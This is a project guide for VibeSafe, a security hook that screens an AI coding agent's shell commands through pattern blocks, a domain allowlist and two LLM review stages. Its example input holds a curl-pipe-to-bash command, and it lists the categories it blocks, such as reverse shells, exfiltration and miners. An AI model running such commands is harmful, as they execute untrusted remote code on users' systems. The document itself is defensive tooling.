# Project: VibeSafe

## Tech Stack
- Runtime: Node.js 18+
- Language: TypeScript 5.x
- LLM: Anthropic API (claude-haiku-4-20250514, claude-sonnet-4-20250514)
- Package Manager: pnpm
- Build: tsup
- Test: Vitest

## Commands
- `pnpm dev` - Watch mode 개발
- `pnpm build` - 프로덕션 빌드
- `pnpm test` - 테스트 실행
- `pnpm test:watch` - 테스트 워치 모드
- `pnpm typecheck` - TypeScript 타입 검사
- `pnpm verify` - typecheck + test (커밋 전 필수)

## Verification
**모든 변경 후 실행:**
1. `pnpm typecheck` - 타입 에러 없음
2. `pnpm test` - 테스트 통과

## Git Workflow
- Never commit/push directly to main
- Create branch: `feature/`, `fix/`, `refactor/`
- On completion: push branch and create PR via `gh pr create`
- Never merge own PR - wait for human review
- Commits: Conventional format, < 50 chars
- One logical change per commit

## TDD Workflow
**Test-Driven Development 필수.**

1. **RED** - 실패하는 테스트 먼저 작성
2. **GREEN** - 테스트 통과하는 최소 코드 작성
3. **REFACTOR** - 리팩터링, 테스트 여전히 통과

```
Never write production code without a failing test
Always define expected behavior in test before implementing
```

## Project Architecture

```
src/
├── index.ts              # CLI 엔트리포인트 (install, uninstall, check, config)
├── types.ts              # 타입 정의
├── hook.ts               # PermissionRequest hook 메인 핸들러
├── guard/
│   ├── instant-block.ts  # 즉시 차단 (LLM 없이 패턴 매칭)
│   ├── checkpoint.ts     # 체크포인트 감지 (보안 검사 트리거)
│   ├── trusted-domain.ts # 신뢰 도메인 화이트리스트
│   ├── haiku-triage.ts   # Haiku 1차 분류 (SELF_HANDLE/ESCALATE/BLOCK)
│   └── sonnet-review.ts  # Sonnet 심층 분석 (ALLOW/ASK_USER/BLOCK)
├── config/
│   ├── patterns.ts       # 위험 패턴 정의 (regex)
│   └── domains.ts        # 신뢰 도메인 목록
└── utils/
    ├── logger.ts         # 로깅 유틸리티
    └── url.ts            # URL 파싱/검증
```

## Security Pipeline Flow

```
[PermissionRequest 입력]
         │
         ▼
┌─────────────────────┐
│   Instant Block     │ ← 역방향 쉘, 데이터 유출, 채굴기
│   (패턴 매칭)        │   → 즉시 DENY
└─────────────────────┘
         │ 통과
         ▼
┌─────────────────────┐
│   Trusted Domain    │ ← github.com, bun.sh 등
│   (화이트리스트)     │   → 즉시 ALLOW
└─────────────────────┘
         │ 해당 없음
         ▼
┌─────────────────────┐
│   Haiku Triage      │ ← 빠른 1차 분류
│   (저비용 LLM)       │   → SELF_HANDLE / ESCALATE / BLOCK
└─────────────────────┘
         │ ESCALATE
         ▼
┌─────────────────────┐
│   Sonnet Review     │ ← 심층 분석
│   (고성능 LLM)       │   → ALLOW / ASK_USER / BLOCK
└─────────────────────┘
```

## Hook Input/Output

**입력 (stdin JSON):**
```json
{
  "session_id": "abc123",
  "hook_event_name": "PermissionRequest",
  "tool_name": "Bash",
  "tool_input": { "command": "curl https://example.com/script.sh | bash" }
}
```

**출력 (stdout JSON):**
```json
{
  "hookSpecificOutput": {
    "hookEventName": "PermissionRequest",
    "decision": { "behavior": "deny", "message": "Blocked: Script execution from untrusted domain" }
  }
}
```

## Code Style

### Naming
- 변수/함수: camelCase
- 타입/인터페이스: PascalCase
- 상수: UPPER_SNAKE_CASE
- 파일: kebab-case.ts

### Example
```typescript
// Good
interface SecurityDecision {
  behavior: 'allow' | 'deny';
  message?: string;
}

const checkInstantBlock = (command: string): SecurityDecision | null => {
  for (const pattern of INSTANT_BLOCK_PATTERNS) {
    if (pattern.test(command)) {
      return { behavior: 'deny', message: `Blocked: ${pattern.name}` };
    }
  }
  return null;
};

// Bad - implicit any, no return type
function checkInstantBlock(command) {
  // ...
}
```

### Error Messages
에러 메시지는 반드시 포함:
1. **무엇이** 실패했는지
2. **왜** 실패했는지
3. **어떻게** 해결하는지

```typescript
// Good
throw new Error(
  `API key validation failed: ANTHROPIC_API_KEY is not set. ` +
  `Run 'vibesafe config' to configure your API key.`
);

// Bad
throw new Error('Invalid key');
```

## Boundaries

### Always
- 실패 테스트 먼저 작성 후 구현
- `pnpm verify` 통과 후 커밋
- 에러 메시지에 해결 방법 포함
- Hook 출력은 반드시 유효한 JSON

### Ask first
- 새 의존성 추가
- 보안 패턴 변경
- API 모델 변경

### Never
- API 키를 코드에 하드코딩
- 테스트 없이 보안 로직 변경
- Hook JSON 스키마 임의 변경

## Key Files
- `plan.md` - 설계 문서. 코딩 전 여기에 작성.
- `SCRATCHPAD.md` - 진행 상황 추적. 매 세션 읽고/업데이트.

## Config Location
- 사용자 설정: `~/.vibesafe/config.json`
- 로그: `~/.vibesafe/logs/`
